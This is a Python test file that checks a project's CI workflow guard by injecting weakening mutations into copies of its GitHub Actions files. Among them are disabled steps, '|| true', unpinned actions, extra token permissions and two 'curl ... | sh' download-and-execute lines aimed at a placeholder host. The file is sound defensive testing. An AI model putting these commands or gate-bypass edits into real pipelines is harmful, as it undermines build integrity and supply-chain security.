#!/usr/bin/env python3
"""Tests for scripts/check-ci-invariants.py and scripts/gate-step-audit.py (0119-MERIDIAN, review F1/F2).

Each case copies .github/workflows to a scratch directory, applies one textual mutation, runs the guard on
the copy (`--workflows DIR`), and requires exit 1 with a named finding. The unmutated copy and a
comment-only edit must pass, so a guard that fails everything cannot pass this test.
The scratch directory is under target/ (never /tmp: disk is tight) and is removed afterwards.

    python3 scripts/test-ci-invariants.py
"""
import json
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
GUARD = ROOT / "scripts" / "check-ci-invariants.py"
AUDIT = ROOT / "scripts" / "gate-step-audit.py"
FAILS = []


def check(cond, msg):
    print(("  ok   " if cond else "  FAIL ") + msg)
    if not cond:
        FAILS.append(msg)


def sub(old, new, count=1):
    def f(text):
        if old not in text:
            raise AssertionError(f"mutation anchor not found: {old[:70]!r}")
        return text.replace(old, new, count)
    return f


CMP_SEQ = "      - name: Compare SEQUENTIAL raw WASM to baseline\n        run:"
CMP_THR = "      - name: Compare THREADED raw WASM to baseline\n        run:"
GATE1 = "      - name: Every gating job must be success (skipped and cancelled are failures)\n        if: ${{ always() }}\n"
GATE_INV = "      - name: Workflow invariants (scripts/check-ci-invariants.py)\n        if: ${{ always() }}\n"
CHECKOUT = "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n        with:\n          persist-credentials: false\n"

# (label, file, mutation, substring the guard must print)
MUTATIONS = [
    ("step-level `if: false` on the sequential compare", "ci.yml",
     sub(CMP_SEQ, CMP_SEQ.replace("        run:", "        if: ${{ false }}\n        run:")), "step-level `if: ${{ false }}`"),
    ("step-level `if: false` on the threaded compare", "ci.yml",
     sub(CMP_THR, CMP_THR.replace("        run:", "        if: ${{ false }}\n        run:")), "step-level `if: ${{ false }}`"),
    ("`!cancelled()` moved onto a compare step", "ci.yml",
     sub(CMP_SEQ, CMP_SEQ.replace("        run:", "        if: ${{ !cancelled() }}\n        run:")), "not in ALLOWED_STEP_IFS"),
    ("an allowed step's `if` widened to always()", "ci.yml",
     sub("      - name: Upload raw sequential WASM\n        if: ${{ !cancelled() }}",
         "      - name: Upload raw sequential WASM\n        if: ${{ always() }}"), "only `!cancelled()` is allowed"),
    ("`|| true` on the audit", "ci.yml",
     sub("            cargo audit --deny warnings\n", "            cargo audit --deny warnings || true\n"), "`|| true`"),
    ("`|| :` on cargo test", "ci.yml",
     sub("        run: cargo test --locked --workspace --all-features\n", "        run: |\n          cargo test --locked --workspace --all-features || :\n"), "`|| true` / `|| :`"),
    ("`set +e` in the threaded compare", "ci.yml",
     sub("          EXPECTED=$(cut -d' ' -f1 engine/pay_equity_engine.threaded.wasm.sha256)",
         "          set +e\n          EXPECTED=$(cut -d' ' -f1 engine/pay_equity_engine.threaded.wasm.sha256)"), "`set +e`"),
    ("`exit 0` in the sequential compare", "ci.yml",
     sub('commit engine/pay_equity_engine.wasm.sha256."\n            exit 1', 'commit engine/pay_equity_engine.wasm.sha256."\n            exit 0'), "`exit 0`"),
    ("`shell: bash {0}` on a gating step", "ci.yml",
     sub(CMP_SEQ, CMP_SEQ.replace("        run:", "        shell: bash {0}\n        run:")), "overrides `shell`"),
    ("top-level `defaults`", "ci.yml",
     sub("permissions:\n  contents: read\n\nconcurrency", "permissions:\n  contents: read\n\ndefaults:\n  run:\n    shell: bash {0}\n\nconcurrency"), "`defaults`"),
    ("gate step 1 edited to exit 0", "ci.yml",
     sub('echo "gate: not success:"; echo "$BAD"; exit 1', 'echo "gate: not success:"; echo "$BAD"; exit 0'), "run text differs"),
    ("gate step 1 gets continue-on-error", "ci.yml", sub(GATE1, GATE1 + "        continue-on-error: true\n"), "has continue-on-error"),
    ("gate step 1 loses its `if: always()`", "ci.yml", sub(GATE1, GATE1.replace("        if: ${{ always() }}\n", "")), "`if` is"),
    ("gate step 1 gets `if: false`", "ci.yml", sub(GATE1, GATE1.replace("always()", "false")), "step-level `if: ${{ false }}`"),
    ("gate's invariants step switched off", "ci.yml", sub(GATE_INV, GATE_INV.replace("always()", "false")), "step-level `if: ${{ false }}`"),
    ("gate's jobs-API step deleted", "ci.yml",
     lambda t: t.replace(t[t.index("      - name: No step of a successful job was skipped"):t.index("      # continue-on-error, a job-level")], ""), "expected 4"),
    ("gate loses actions: read", "ci.yml", sub("      contents: read\n      actions: read\n", "      contents: read\n"), "job-level permissions"),
    ("job-level `permissions: contents: write` on wasm-seq", "ci.yml",
     sub("  wasm-seq:\n    name: WASM Sequential (build, bindgen, baseline compare)\n    runs-on: ubuntu-latest\n    timeout-minutes: 30\n",
         "  wasm-seq:\n    name: WASM Sequential (build, bindgen, baseline compare)\n    runs-on: ubuntu-latest\n    timeout-minutes: 30\n    permissions:\n      contents: write\n"),
     "job-level permissions"),
    ("job-level `id-token: write` on gate", "ci.yml",
     sub("      contents: read\n      actions: read\n", "      contents: read\n      actions: read\n      id-token: write\n"), "job-level permissions"),
    ("job-level continue-on-error on quality", "ci.yml",
     sub("    timeout-minutes: 40\n", "    timeout-minutes: 40\n    continue-on-error: true\n"), "gating job quality has continue-on-error"),
    ("step-level continue-on-error on the sequential compare", "ci.yml",
     sub(CMP_SEQ, CMP_SEQ.replace("        run:", "        continue-on-error: true\n        run:")), "has continue-on-error"),
    ("job-level `if: always()` on memory-ceiling", "ci.yml",
     sub("  memory-ceiling:\n    name: Memory Ceiling (50k @ N=8 < 326 MiB)\n    runs-on: ubuntu-latest\n    timeout-minutes: 30\n",
         "  memory-ceiling:\n    name: Memory Ceiling (50k @ N=8 < 326 MiB)\n    runs-on: ubuntu-latest\n    timeout-minutes: 30\n    if: ${{ always() }}\n"),
     "gating job memory-ceiling has job-level `if:"),
    ("browser-parity loses its `if`", "ci.yml",
     sub("    if: ${{ always() && needs.wasm-threaded.result != 'cancelled' }}\n", ""), "browser-parity must carry"),
    ("gate needs loses memory-ceiling", "ci.yml", sub("      - memory-ceiling\n", ""), "gate.needs differs"),
    ("gate job renamed", "ci.yml", sub("    name: gate\n", "    name: gate-check\n"), "gate job's name"),
    ("gate job loses `if: always()`", "ci.yml", sub("    if: ${{ always() }}\n    needs:", "    needs:"), "must run `if: always()`"),
    ("gate job has no timeout", "ci.yml", sub("    timeout-minutes: 10\n", ""), "no integer timeout-minutes"),
    ("unpinned action", "ci.yml", sub("actions/checkout@11d5960a326750d5838078e36cf38b85af677262", "actions/checkout@v4"), "not pinned to a full commit SHA"),
    ("`npm install`", "ci.yml", sub("npm ci --no-audit --no-fund", "npm install"), "`npm install`"),
    ("top-level contents: write", "ci.yml",
     sub("permissions:\n  contents: read\n\nconcurrency", "permissions:\n  contents: write\n\nconcurrency"), "top-level permissions"),
    ("paths-ignore on push", "ci.yml",
     sub('    branches: ["main"]\n  pull_request:', '    branches: ["main"]\n    paths-ignore: ["docs/**"]\n  pull_request:'), "paths-ignore"),
    ("download piped into a shell", "ci.yml",
     sub("      - name: Run Tests\n        run: cargo test --locked --workspace --all-features\n",
         "      - name: Run Tests\n        run: |\n          curl -sSfL https://example.invalid/i.sh | sh\n          cargo test --locked --workspace --all-features\n"),
     "downloads piped into a shell"),
    ("release.yml: id-token: write back on the release job", "release.yml",
     sub("      contents: write\n", "      contents: write\n      id-token: write\n"), "job-level permissions"),
    ("release.yml: top-level contents: write", "release.yml",
     sub("permissions:\n  contents: read\n\njobs:", "permissions:\n  contents: write\n\njobs:"), "top-level permissions"),
    ("release.yml: install script piped into a shell", "release.yml",
     sub("          syft --version\n", "          curl -sSfL https://example.invalid/install.sh | sh -s -- -b /usr/local/bin\n          syft --version\n"),
     "downloads piped into a shell"),
    ("release.yml: a step `|| true`", "release.yml", sub("          syft --version\n", "          syft --version || true\n"), "`|| true`"),
    ("release.yml: check-tag gets contents: write", "release.yml",
     sub("      contents: read\n      checks: read\n", "      contents: write\n      checks: read\n"), "job-level permissions"),
    ("release.yml: check-tag loses checks: read", "release.yml",
     sub("      contents: read\n      checks: read\n", "      contents: read\n"), "job-level permissions"),
    ("release.yml: job-level permissions on publish-crates", "release.yml",
     sub("    timeout-minutes: 45\n    steps:", "    timeout-minutes: 45\n    permissions:\n      contents: write\n    steps:"), "job-level permissions"),
    ("release.yml: id-token: write on the book job", "release.yml",
     sub("    permissions:\n      contents: write\n    steps:\n      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n        with:\n          fetch-depth: 0\n\n      # Prebuilt",
         "    permissions:\n      contents: write\n      id-token: write\n    steps:\n      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n        with:\n          fetch-depth: 0\n\n      # Prebuilt"),
     "job-level permissions"),
    ("release.yml: `|| true` on the publish dry run", "release.yml",
     sub("run: cargo publish --workspace --dry-run --locked\n", "run: cargo publish --workspace --dry-run --locked || true\n"), "`|| true`"),
    ("release.yml: the token check exits 0", "release.yml",
     sub("            exit 1\n          fi\n          cargo publish --workspace --locked\n", "            exit 0\n          fi\n          cargo publish --workspace --locked\n"), "`exit 0`"),
    ("release.yml: step-level `if: false` on the gate lookup", "release.yml",
     sub("      - name: Read the tagged commit's gate check runs\n", "      - name: Read the tagged commit's gate check runs\n        if: ${{ false }}\n"), "step-level `if: ${{ false }}`"),
    ("release.yml: `shell: bash {0}` on the build step", "release.yml",
     sub("      - name: Build oaxaca-cli and meridian-mcp\n", "      - name: Build oaxaca-cli and meridian-mcp\n        shell: bash {0}\n"), "overrides `shell`"),
    ("release.yml: the release action unpinned", "release.yml",
     sub("softprops/action-gh-release@efb35369e0ad2afab669f228072c1b0d510eae64", "softprops/action-gh-release@v3"), "not pinned to a full commit SHA"),
    ("release.yml: the binaries job has no timeout", "release.yml", sub("    timeout-minutes: 90\n", ""), "no integer timeout-minutes"),
    ("release.yml: publish-crates stops waiting for verify", "release.yml",
     sub("needs: [check-tag, verify, binaries]", "needs: [check-tag, binaries]"), "job publish-crates does not need ['verify']"),
    ("release.yml: publish-crates stops waiting for the binaries", "release.yml",
     sub("needs: [check-tag, verify, binaries]", "needs: [check-tag, verify]"), "job publish-crates does not need ['binaries']"),
    ("release.yml: verify stops waiting for check-tag", "release.yml",
     sub("    needs: [check-tag]\n    runs-on: ubuntu-latest\n    timeout-minutes: 60", "    runs-on: ubuntu-latest\n    timeout-minutes: 60"), "job verify does not need ['check-tag']"),
    ("release.yml: the release page stops waiting for publish-crates", "release.yml",
     sub("needs: [check-tag, publish-crates, binaries]", "needs: [check-tag, binaries]"), "job github-release does not need ['publish-crates']"),
    ("release.yml: check-tag is made to wait", "release.yml",
     sub("    name: Check the tag\n", "    name: Check the tag\n    needs: [verify]\n"), "must run first"),
    ("release.yml: a job nobody reviewed", "release.yml",
     sub("  book:\n    name: Documentation site\n", "  extra:\n    name: Extra\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    steps:\n      - run: echo hi\n\n  book:\n    name: Documentation site\n"),
     "not in the reviewed release graph"),
    ("release.yml: the registry token read by another job", "release.yml",
     sub("      - name: Tests\n        run: cargo test --locked --workspace --all-features\n",
         "      - name: Tests\n        env:\n          CARGO_REGISTRY_TOKEN: ${{ secrets.CARGO_REGISTRY_TOKEN }}\n        run: cargo test --locked --workspace --all-features\n"),
     "reads CARGO_REGISTRY_TOKEN"),
    ("ci.yml: gate needs loses portability", "ci.yml", sub("      - portability\n", ""), "gate.needs differs"),
]

# These must still pass: the guard is not allowed to fail everything.
CONTROLS = [
    ("unmutated workflows", "ci.yml", lambda t: t),
    ("a comment-only edit", "ci.yml", lambda t: "# a harmless comment\n" + t),
    ("a comment-only edit to release.yml", "release.yml", lambda t: "# a harmless comment\n" + t),
    ("a harmless extra step in release.yml's verify job", "release.yml",
     sub("      - name: Check formatting\n", "      - name: Print versions\n        run: cargo --version\n\n      - name: Check formatting\n")),
    ("a harmless extra step without `if`", "ci.yml",
     sub("      - name: Run Tests\n", "      - name: Print versions\n        run: cargo --version\n\n      - name: Run Tests\n")),
]


def run_guard(mutation_file, mutate, scratch_root):
    d = Path(tempfile.mkdtemp(prefix="wf-", dir=scratch_root))
    shutil.copytree(ROOT / ".github" / "workflows", d, dirs_exist_ok=True)
    path = d / mutation_file
    path.write_text(mutate(path.read_text()))
    p = subprocess.run([sys.executable, str(GUARD), "--workflows", str(d)], capture_output=True, text=True)
    return p.returncode, p.stdout + p.stderr


def job(name, conclusion, steps):
    return {"name": name, "conclusion": conclusion, "steps": [{"name": n, "conclusion": c} for n, c in steps]}


def test_step_audit(scratch_root):
    print("gate-step-audit: skipped and cancelled steps of a successful job")
    ok_steps = [("Set up job", "success"), ("Compare", "success"), ("Complete job", "success")]
    cases = [
        ("all success", [job("a", "success", ok_steps), job("b", "success", ok_steps)], 2, 0, "every step success"),
        ("a skipped step in a successful job", [job("a", "success", ok_steps), job("b", "success", [("Compare", "skipped")])], 2, 1, "'Compare' is 'skipped'"),
        ("a cancelled step in a successful job", [job("a", "success", [("Compare", "cancelled")])], 1, 1, "'cancelled'"),
        ("too few jobs in the answer", [job("a", "success", ok_steps)], 2, 1, "expected at least 2"),
        ("empty answer", [], 1, 1, "expected at least 1"),
        ("gate's own unfinished steps are ignored", [job("a", "success", ok_steps), job("gate", None, [("x", None)])], 1, 0, "every step success"),
        ("a skipped job as a whole is ignored (step 1 of gate owns it)", [job("a", "success", ok_steps), job("Benchmark", "skipped", [])], 1, 0, "every step success"),
    ]
    for label, jobs, expect, want_rc, want_text in cases:
        f = Path(scratch_root) / "jobs.json"
        f.write_text(json.dumps({"total_count": len(jobs), "jobs": jobs}))
        p = subprocess.run([sys.executable, str(AUDIT), str(f), "--expect-jobs", str(expect)], capture_output=True, text=True)
        check(p.returncode == want_rc and want_text in p.stdout, f"{label}: exit {p.returncode}, {p.stdout.strip()[:100]!r}")
    # paginated output (two objects back to back)
    f = Path(scratch_root) / "paged.json"
    f.write_text(json.dumps({"jobs": [job("a", "success", ok_steps)]}) + "\n" + json.dumps({"jobs": [job("b", "success", [("Compare", "skipped")])]}))
    p = subprocess.run([sys.executable, str(AUDIT), str(f), "--expect-jobs", "2"], capture_output=True, text=True)
    check(p.returncode == 1 and "'b'" in p.stdout, "paginated answers (two JSON objects) are both read")
    f.write_text("not json")
    p = subprocess.run([sys.executable, str(AUDIT), str(f)], capture_output=True, text=True)
    check(p.returncode == 2, f"unreadable input exits 2 (got {p.returncode})")


def main():
    base = ROOT / "target" / "0119-tests"
    base.mkdir(parents=True, exist_ok=True)
    scratch_root = Path(tempfile.mkdtemp(prefix="ci-invariants-", dir=base))
    try:
        print("controls (must pass)")
        for label, fname, mutate in CONTROLS:
            rc, out = run_guard(fname, mutate, scratch_root)
            check(rc == 0 and "workflow invariants: ok" in out, f"{label}: exit {rc}" + ("" if rc == 0 else f" {out.strip()[-200:]!r}"))
        print("mutations (each must fail with its named finding)")
        for label, fname, mutate, want in MUTATIONS:
            try:
                rc, out = run_guard(fname, mutate, scratch_root)
            except AssertionError as e:
                check(False, f"{label}: {e}")
                continue
            ok = rc == 1 and want in out
            check(ok, f"{label}: exit {rc}, expected finding {want!r}" + ("" if ok else f"; output: {out.strip()[-300:]!r}"))
        test_step_audit(scratch_root)
    finally:
        shutil.rmtree(scratch_root, ignore_errors=True)
    print("\n" + ("FAILED: " + "; ".join(FAILS) if FAILS else f"all checks passed ({len(CONTROLS)} controls, {len(MUTATIONS)} mutations)"))
    return 1 if FAILS else 0


if __name__ == "__main__":
    sys.exit(main())
